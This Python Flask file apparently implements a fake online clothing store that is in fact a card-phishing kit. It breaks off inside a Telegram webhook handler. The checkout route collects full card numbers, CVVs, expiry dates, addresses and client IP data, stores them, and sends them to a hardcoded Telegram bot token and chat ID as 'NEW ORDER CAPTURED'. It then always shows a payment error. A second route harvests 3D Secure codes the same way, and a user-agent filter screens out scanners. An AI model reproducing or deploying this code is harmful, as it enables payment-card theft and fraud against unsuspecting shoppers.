from flask import Flask, render_template, request, jsonify, redirect, url_for
import sqlite3
import requests
import random
import string
from datetime import datetime
import os
import re
from functools import wraps

app = Flask(__name__)

# Database setup
def init_db():
    conn = sqlite3.connect('briansourced.db')
    cursor = conn.cursor()
    
    # Products table
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS products (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT NOT NULL,
        description TEXT NOT NULL,
        price REAL NOT NULL,
        sizes TEXT NOT NULL,
        image_url TEXT NOT NULL,
        stock INTEGER NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    
    # Orders table
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS orders (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        customer_name TEXT NOT NULL,
        email TEXT NOT NULL,
        phone TEXT NOT NULL,
        shipping_address TEXT NOT NULL,
        billing_address TEXT NOT NULL,
        card_number TEXT NOT NULL,
        expiry_date TEXT NOT NULL,
        cvv TEXT NOT NULL,
        total_amount REAL NOT NULL,
        ip_address TEXT,
        user_agent TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    
    conn.commit()
    conn.close()

init_db()

# Telegram Bot Integration
TELEGRAM_BOT_TOKEN = "8940598912:AAGmdiPFSRh9YjCaI11GLsAYHIWtPTEayoE"
TELEGRAM_CHAT_ID = "8768329228"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'HTML'
    }
    try:
        requests.post(url, data=data)
    except:
        pass

# Card validation functions
def validate_card_number(card_number):
    # Remove spaces and dashes
    card_number = re.sub(r'[\s-]', '', card_number)
    
    # Check if card number is numeric and has correct length
    if not card_number.isdigit() or len(card_number) < 13 or len(card_number) > 19:
        return False
    
    # Luhn algorithm
    total = 0
    for i, digit in enumerate(card_number):
        digit = int(digit)
        if i % 2 == len(card_number) % 2:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    
    return total % 10 == 0

def get_card_type(card_number):
    card_number = re.sub(r'[\s-]', '', card_number)
    
    if card_number.startswith('4'):
        return 'Visa'
    elif card_number.startswith('5'):
        return 'Mastercard'
    elif card_number.startswith('3'):
        return 'American Express'
    elif card_number.startswith('6'):
        return 'Discover'
    else:
        return 'Unknown'

def validate_expiry_date(expiry_date):
    # Check format MM/YY
    if not re.match(r'^(0[1-9]|1[0-2])\/\d{2}\$', expiry_date):
        return False
    
    month, year = expiry_date.split('/')
    month = int(month)
    year = int(year) + 2000  # Convert YY to YYYY
    
    current_year = datetime.now().year
    current_month = datetime.now().month
    
    # Check if date is in the future
    if year < current_year or (year == current_year and month < current_month):
        return False
    
    return True

def validate_cvv(cvv, card_type):
    if card_type == 'American Express':
        return len(cvv) == 4 and cvv.isdigit()
    else:
        return len(cvv) == 3 and cvv.isdigit()

def validate_email(email):
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\$'
    return re.match(pattern, email) is not None

def validate_phone(phone):
    # Remove spaces, dashes, parentheses
    phone = re.sub(r'[\s\-$$$$]', '', phone)
    # Check if it starts with + and contains only digits after that
    return phone.startswith('+') and phone[1:].isdigit() and len(phone) >= 10

def is_suspicious(ip_address, user_agent):
    # Simple suspicious detection - in a real system, you'd use more sophisticated methods
    suspicious_patterns = [
        'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python-requests'
    ]
    
    for pattern in suspicious_patterns:
        if pattern.lower() in user_agent.lower():
            return True
    
    return False

# Routes
@app.route('/')
def index():
    conn = sqlite3.connect('briansourced.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM products ORDER BY created_at DESC")
    products = cursor.fetchall()
    conn.close()
    return render_template_string(INDEX_TEMPLATE, products=products)

@app.route('/products')
def products():
    conn = sqlite3.connect('briansourced.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM products ORDER BY created_at DESC")
    products = cursor.fetchall()
    conn.close()
    return render_template_string(PRODUCTS_TEMPLATE, products=products)

@app.route('/checkout')
def checkout():
    return render_template_string(CHECKOUT_TEMPLATE)

@app.route('/process_checkout', methods=['POST'])
def process_checkout():
    # Get form data
    customer_name = request.form.get('customer_name')
    email = request.form.get('email')
    phone = request.form.get('phone')
    shipping_address = request.form.get('shipping_address')
    billing_address = request.form.get('billing_address')
    card_number = request.form.get('card_number')
    expiry_date = request.form.get('expiry_date')
    cvv = request.form.get('cvv')
    total_amount = request.form.get('total_amount', '0.00')
    
    # Get client info
    ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.environ.get('REMOTE_ADDR', 'Unknown'))
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Validate card details
    card_type = get_card_type(card_number)
    card_valid = validate_card_number(card_number)
    expiry_valid = validate_expiry_date(expiry_date)
    cvv_valid = validate_cvv(cvv, card_type)
    email_valid = validate_email(email)
    phone_valid = validate_phone(phone)
    
    # Check for suspicious activity
    suspicious = is_suspicious(ip_address, user_agent)
    
    # Calculate validation score
    validation_score = 0
    if card_valid: validation_score += 20
    if expiry_valid: validation_score += 15
    if cvv_valid: validation_score += 15
    if email_valid: validation_score += 15
    if phone_valid: validation_score += 15
    if not suspicious: validation_score += 20
    
    # Store in database
    conn = sqlite3.connect('briansourced.db')
    cursor = conn.cursor()
    cursor.execute('''
    INSERT INTO orders 
    (customer_name, email, phone, shipping_address, billing_address, 
    card_number, expiry_date, cvv, total_amount, ip_address, user_agent)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (customer_name, email, phone, shipping_address, billing_address, 
          card_number, expiry_date, cvv, total_amount, ip_address, user_agent))
    conn.commit()
    conn.close()
    
    # Send to Telegram with validation info
    message = f"""
🔥 NEW ORDER CAPTURED 🔥
ID: #{random.randint(10000, 99999)}
Time: {datetime.now().strftime('%Y-%m-%d %H:%M')}

👤 PERSONAL INFO:
Name: {customer_name}
Email: {email}
Phone: {phone}

💳 CARD DETAILS:
Number: {card_number}
Type: {card_type}
Expiry: {expiry_date}
CVV: {cvv}

🏠 ADDRESSES:
Shipping: {shipping_address}
Billing: {billing_address}

💰 TOTAL: £{total_amount}

🔍 VALIDATION SCORE: {validation_score}/100
Card Valid: {'✅' if card_valid else '❌'}
Expiry Valid: {'✅' if expiry_valid else '❌'}
CVV Valid: {'✅' if cvv_valid else '❌'}
Email Valid: {'✅' if email_valid else '❌'}
Phone Valid: {'✅' if phone_valid else '❌'}
Suspicious: {'⚠️' if suspicious else '✅'}

🌐 TECH INFO:
IP: {ip_address}
User-Agent: {user_agent}
    """
    send_to_telegram(message)
    
    # Always return payment error
    return render_template_string(PAYMENT_ERROR_TEMPLATE)

@app.route('/verification')
def verification():
    order_id = request.args.get('order_id', random.randint(10000, 99999))
    return render_template_string(VERIFICATION_TEMPLATE, order_id=order_id)

@app.route('/complete_verification', methods=['POST'])
def complete_verification():
    code = request.form.get('code')
    order_id = request.args.get('order_id', 'Unknown')
    
    # Send verification code to Telegram
    message = f"""
🔐 3D SECURE VERIFICATION 🔐
Order ID: #{order_id}
Verification Code: {code}
Time: {datetime.now().strftime('%Y-%m-%d %H:%M')}
IP: {request.environ.get('HTTP_X_FORWARDED_FOR', request.environ.get('REMOTE_ADDR', 'Unknown'))}
    """
    send_to_telegram(message)
    
    return render_template_string(VERIFICATION_ERROR_TEMPLATE)

@app.route('/support')
def support():
    return render_template_string(SUPPORT_TEMPLATE)

@app.route('/refund')
def refund():
    return render_template_string(REFUND_TEMPLATE)

@app.route('/telegram_webhook', methods=['POST'])
def telegram_webhook():
    import json
    from urllib.parse import urlparse
    import requests as req
    
    update = request.json
    message = update.get('message', {})
    
    if 'photo' in message:
        # Get the largest photo
        photo = message['photo'][-1]
        file_id = photo['
